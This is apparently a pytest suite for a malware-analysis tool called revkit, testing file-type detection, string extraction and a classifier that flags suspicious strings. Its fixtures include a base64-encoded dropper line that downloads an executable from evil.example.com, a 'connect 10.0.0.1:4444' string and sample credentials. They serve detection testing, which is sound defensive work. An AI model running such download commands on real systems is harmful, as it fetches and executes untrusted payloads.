"""Basic regression tests for revkit. Run with: pytest"""
import argparse
import base64
import io
import json
import os
import sys
import zipfile

import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
import revkit  # noqa: E402


def _args(**kw):
    defaults = dict(ghidra=False, all_strings=False, carve=False, max_depth=3)
    defaults.update(kw)
    return argparse.Namespace(**defaults)


# --------------------------------------------------------------------------- utils
def test_entropy_bounds():
    assert revkit.entropy(b"") == 0.0
    assert revkit.entropy(b"AAAA") == 0.0
    assert revkit.entropy(bytes(range(256))) == pytest.approx(8.0)


def test_string_extraction():
    data = b"\x00\x01hello world\x00\x01\x01" + "unicode!".encode("utf-16le") + b"\x00"
    assert (2, "hello world") in list(revkit.ascii_strings(data))
    assert any(s == "unicode!" for _, s in revkit.utf16_strings(data))


# --------------------------------------------------------------------------- detection
@pytest.mark.parametrize(
    "data,path,expected",
    [
        (b"MZ" + b"\x00" * 100, "a.exe", "pe"),
        (b"\x7fELF" + b"\x00" * 100, "a", "elf"),
        (b"\xcf\xfa\xed\xfe" + b"\x00" * 100, "a", "macho"),
        (b"%PDF-1.7\n", "a.pdf", "pdf"),
        (b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 100, "a.doc", "ole"),
        (b"\x1f\x8b\x08" + b"\x00" * 20, "a.gz", "gzip"),
        (b"dex\n035\x00" + b"\x00" * 100, "a.dex", "dex"),
        (b"#!/bin/bash\necho hi\n", "a.sh", "script"),
        (bytes(range(256)) * 4, "a.dat", "blob"),
    ],
)
def test_detect(data, path, expected):
    assert revkit.detect(data, path) == expected


def _zip(names):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        for n in names:
            z.writestr(n, b"x")
    return buf.getvalue()


@pytest.mark.parametrize(
    "names,expected",
    [
        (["AndroidManifest.xml", "classes.dex"], "apk"),
        (["META-INF/MANIFEST.MF", "a/B.class"], "jar"),
        (["[Content_Types].xml", "word/document.xml"], "ooxml"),
        (["readme.txt"], "zip"),
    ],
)
def test_detect_zip_flavours(names, expected):
    assert revkit.detect(_zip(names), "x.zip") == expected


# --------------------------------------------------------------------------- classification
def _cats(s):
    return {c for c, _, _ in revkit.classify_string(s)}


@pytest.mark.parametrize(
    "s,cat",
    [
        ("AKIAIOSFODNN7EXAMPLE", "aws-key"),
        ("-----BEGIN RSA PRIVATE KEY-----", "private-key"),
        ("password=hunter22", "cred-assign"),
        ("http://evil.example.com/payload", "url"),
        ("connect 10.0.0.1:4444", "ipv4"),
        ("ftp://user:pass@host.example/", "url-creds"),
        ("5f4dcc3b5aa765d61d8327deb882cf99", "hash"),
        (base64.b64encode(b"this is a secret message!").decode(), "base64"),
    ],
)
def test_classify_string(s, cat):
    assert cat in _cats(s)


def test_classify_benign_string():
    assert _cats("just an ordinary sentence") == set()


# --------------------------------------------------------------------------- end-to-end
def test_analyze_script_end_to_end(tmp_path, capsys):
    sample = tmp_path / "dropper.ps1"
    payload = base64.b64encode(b"Invoke-WebRequest http://evil.example.com/x.exe").decode()
    sample.write_text(f"$p = 'password=SuperSecret1'\n$b = '{payload}'\n")
    out = tmp_path / "out"
    rep = revkit.analyze_file(str(sample), str(out), _args())

    assert (out / "report.md").is_file()
    report = json.loads((out / "report.json").read_text())
    assert report["meta"]["type"] == "script"
    assert report["meta"]["sha256"]
    cats = {f[1] for f in rep.findings}
    assert "cred-assign" in cats


def test_analyze_zip_recurses(tmp_path):
    sample = tmp_path / "bundle.zip"
    with zipfile.ZipFile(sample, "w") as z:
        z.writestr("config.txt", "api_key=abcdef123456\n")
    out = tmp_path / "out"
    rep = revkit.analyze_file(str(sample), str(out), _args())
    assert any("cred-assign" == f[1] for f in rep.findings)


def test_cli_version(capsys, monkeypatch):
    monkeypatch.setattr(sys, "argv", ["revkit", "--version"])
    with pytest.raises(SystemExit) as e:
        revkit.main()
    assert e.value.code == 0
    assert revkit.__version__ in capsys.readouterr().out
